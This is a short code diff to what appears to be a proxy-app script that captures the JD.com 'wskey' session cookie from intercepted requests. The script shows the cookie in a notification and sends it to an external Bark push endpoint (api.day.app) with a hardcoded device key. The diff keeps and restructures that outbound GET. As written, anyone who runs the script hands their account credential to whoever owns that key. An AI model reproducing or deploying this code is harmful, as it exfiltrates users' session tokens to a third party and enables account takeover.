@@ -41,10 +41,12 @@ function GetCookie() {
     try {
         if ($request.url.indexOf('https://rjsb-token-m.jd.com/gettoken_c') > -1) {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
-                var wsk = CV.match(/wskey=.+?;/);
-                $.notify("成功",'',wsk)
-                $.http.get('https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/wsk获取成功?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png')
-            }else {
+            var wsk = CV.match(/wskey=.+?;/);
+            $.notify("成功",'',wsk)
+            var notifyUrl='https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/wsk获取成功?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png'
+            $.notify("通知地址",'',notifyUrl)
+            $.http.get(notifyUrl)
+        }else {
             $.notify('获取失败', '', '请检查匹配URL或配置内脚本类型 ‼️');
         }
     } catch (eor) {
